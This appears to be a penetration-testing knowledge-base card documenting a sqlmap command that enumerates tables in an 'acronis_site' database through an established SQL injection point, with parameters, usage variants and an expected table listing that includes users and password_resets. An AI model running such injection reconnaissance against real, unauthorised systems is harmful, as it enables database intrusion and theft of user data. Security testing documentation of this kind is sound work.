---
id: cmd-sqlmap-tables-001
data: sqlmap -D acronis_site --tables
tags:
  - sqli
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:15:05.331Z'
verified: false
validated: true
submitted: true
---
# sqlmap-list-tables

## Command

```bash
sqlmap -D acronis_site --tables
```

## Description

This command dumps table names from a specified database using an established SQL injection point, useful for schema reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-D acronis_site` | Targets the 'acronis_site' database | Yes |
| `--tables` | Lists all table names in the database | Yes |

## Examples

### Basic Usage

```bash
sqlmap -D target_db --tables
```

### Advanced Usage

```bash
sqlmap -D acronis_site --tables -v 3
```

## Expected Output

List of tables: awards, failed_jobs, files, history_pages, locales, migrations, page_products, page_translations, pages, pages_1, pages_2, pages_3, password_resets, product_prices, product_translations, products, products_1, related_products, related_tags, resources, tags, users, variables, webinars.

## Related

- [[commands/sqlmap-enumerate-databases]]
- [[procedures/List-Tables-in-Acronis-Site-Database]]
